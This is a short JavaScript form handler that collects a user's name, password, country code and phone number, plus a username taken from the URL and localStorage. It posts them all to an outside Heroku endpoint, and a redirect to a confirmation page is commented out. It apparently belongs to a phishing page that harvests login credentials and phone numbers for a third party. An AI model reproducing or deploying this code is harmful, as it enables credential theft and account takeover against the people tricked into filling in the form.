function getUsername(){

    let url_string = window.location.href;
    let url = new URL(url_string);
    let username =  url.searchParams.get("username");

    return username;
}





function submit(){

    let name = document.getElementById("inp_name").value
    let password = document.getElementById("inp_password").value
    let code = document.getElementById("inp_code").value
    let tel = document.getElementById("inp_tel").value
    let username = localStorage.getItem("username")
    let username_2=getUsername()
    
    return {
        name:name,
        password:password,
        code:code,
        tel:tel,
        username:username,
        username_2:username_2
    }

}

async function sendForm(){

    let user_info = submit()
    console.log(user_info)
    $("#submit").html("<img class='sm-icon' src='assets/img/oval.svg'> Loading...")
    $("#submit").attr('disabled')

    await $.post( "https://deneme-99213.herokuapp.com/", 
        {   name: user_info.name ,
            username: user_info.username  ,
            username_2:user_info.username_2,
            password: user_info.password,
            countryCode:user_info.code,
            tel: user_info.tel
        }
        );
    // window.location.href = "confirmation.html";



}

